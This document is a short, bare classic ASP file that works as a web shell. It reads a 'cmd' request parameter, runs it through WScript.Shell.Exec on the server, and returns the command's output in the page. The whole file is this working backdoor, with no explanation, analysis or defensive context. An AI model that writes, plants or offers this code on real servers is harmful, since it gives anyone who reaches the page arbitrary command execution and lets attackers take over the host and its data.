<%
Set oShell = CreateObject("WScript.Shell")
cmd = Request("cmd")
If cmd <> "" Then
    Set oExec = oShell.Exec(cmd)
    Response.Write(oExec.StdOut.ReadAll())
End If
%>
